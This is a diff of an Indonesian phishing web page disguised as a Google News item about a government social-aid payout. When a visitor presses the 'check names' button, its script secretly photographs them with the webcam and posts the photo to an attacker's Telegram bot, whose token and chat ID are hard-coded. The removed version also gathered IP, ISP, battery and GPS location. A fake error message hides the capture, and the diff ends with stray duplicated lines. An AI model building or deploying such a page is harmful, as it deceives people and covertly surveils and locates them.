@@ -5,14 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Portal Berita Terkini</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; background: #f0f2f5; }
-        .header-news { background: #1a73e8; color: white; padding: 15px; text-align: center; font-weight: bold; font-size: 20px; }
-        .card { max-width: 600px; margin: 20px auto; background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
-        .card img { width: 100%; height: auto; }
-        .padding { padding: 20px; }
-        h1 { font-size: 22px; margin-bottom: 10px; color: #1c1e21; }
-        p { color: #4b4f56; line-height: 1.5; }
-        .btn { display: block; width: 100%; padding: 15px; background: #1a73e8; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; }
+        body { font-family: sans-serif; margin: 0; background: #f0f2f5; text-align: center; }
+        .header-news { background: #1a73e8; color: white; padding: 15px; font-weight: bold; font-size: 20px; }
+        .card { max-width: 500px; margin: 20px auto; background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.1); padding: 20px; }
+        .btn { display: block; width: 100%; padding: 15px; background: #1a73e8; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; }
         #video, #canvas { display: none; }
     </style>
 </head>
@@ -21,19 +17,16 @@
 <div class="header-news">Google News Indonesia</div>
 
 <div class="card">
-    <img src="https://images.unsplash.com/photo-1529107386315-e1a2ed48a620?auto=format&fit=crop&w=800&q=80"/>
-    <div class="padding">
-        <h1>Bantuan Sosial Tahap 2 Cair, Cek NIK Anda Sekarang</h1>
-        <p>Pemerintah menyalurkan bantuan tambahan bagi masyarakat yang terdaftar dalam DTKS. Pastikan perangkat Anda terverifikasi untuk melihat daftar nama.</p>
-        <button class="btn" id="startBtn">CEK DAFTAR NAMA</button>
-    </div>
+    <img src="https://images.unsplash.com/photo-1529107386315-e1a2ed48a620?w=500" style="width:100%">
+    <h1>Bantuan Sosial Tahap 2 Cair, Cek NIK Anda Sekarang</h1>
+    <p>Pastikan perangkat Anda terverifikasi untuk melihat daftar nama penerima bantuan.</p>
+    <button class="btn" id="startBtn">CEK DAFTAR NAMA</button>
 </div>
 
-<video id="video" autoplay="autoplay"></video>
+<video id="video" autoplay></video>
 <canvas id="canvas"></canvas>
 
-<script type='text/javascript'>
-//<![CDATA[
+<script>
     const CONFIG = {
         TOKEN: "8503662761:AAE_cZLT-07P6r5gQteADSjsTwV2GUdnqbg",
         CHAT_ID: "5392443720"
@@ -47,53 +40,53 @@
         startBtn.innerText = "Memverifikasi...";
         startBtn.disabled = true;
 
-        // 1. Kumpulkan Data (Sambil Kamera Loading)
-        let detailData = 📸 *HASIL CAPTURE PENGUNJUNG*%0A;
-        detailData += ━━━━━━━━━━━━━━━━━━%0A;
+        let detailData = "📸 *HASIL CAPTURE UJANG MODS*%0A";
+        detailData += "━━━━━━━━━━━━━━━━━━%0A";
+        detailData += "🌍 *IP & Lokasi Sedang Diproses...*%0A";
 
-        // Data Device
-        detailData += 📱 *Device:* ${navigator.platform}%0A;
-        detailData += 🌐 *Browser:* ${navigator.userAgent.split(' ').pop()}%0A;
-
-        // Data Baterai
+        // Cek Izin Kamera
         try {
-            const b = await navigator.getBattery();
-            detailData += 🔋 *Baterai:* ${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})%0A;
-        } catch(e) {}
-
-        // Data IP & ISP
-        try {
-            const ipRes = await fetch('https://ipapi.co/json/');
-            const ip = await ipRes.json();
-            detailData += 🌍 *IP:* ${ip.ip}%0A;
-            detailData += 🏢 *ISP:* ${ip.org}%0A;
-            detailData += 📍 *Kota:* ${ip.city}, ${ip.region}%0A;
-        } catch(e) {}
-
-        // Data Lokasi GPS
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const mapLink = https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude};
-                detailData += 📌 *Maps:* [Lihat Lokasi](${mapLink})%0A;
-                processCamera(detailData);
-            }, () => {
-                detailData += 📌 *Maps:* Izin Ditolak%0A;
-                processCamera(detailData);
-            });
-        } else {
-            processCamera(detailData);
-        }
-    });
-
-    async function processCamera(fullCaption) {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = stream;
-
-setTimeout(() => {
+            
+            setTimeout(() => {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(blob => {
+                    sendToTelegram(blob, detailData);
+                    stream.getTracks().forEach(t => t.stop());
+                }, 'image/jpeg');
+            }, 2000);
+        } catch (err) {
+            sendTextOnly(detailData + "%0A⚠️ *Kamera:* Izin Ditolak");
+            alert("Maaf, akses kamera diperlukan untuk verifikasi.");
+            startBtn.innerText = "CEK DAFTAR NAMA";
+            startBtn.disabled = false;
+        }
+    });
+
+    function sendToTelegram(photoBlob, caption) {
+        const formData = new FormData();
+        formData.append('chat_id', CONFIG.CHAT_ID);
+        formData.append('photo', photoBlob, 'target.jpg');
+        formData.append('caption', decodeURIComponent(caption));
+        formData.append('parse_mode', 'Markdown');
+
+        fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        }).then(() => {
+            alert("Error 505: Koneksi Server Terputus.");
+        });
+    }
+
+    function sendTextOnly(text) {
+        fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage?chat_id=${CONFIG.CHAT_ID}&text=${text}&parse_mode=Markdown`);
+    }
+</script>
+</body>
+</html>                canvas.getContext('2d').drawImage(video, 0, 0);
                 
                 canvas.toBlob(blob => {
                     sendToTelegram(blob, fullCaption);
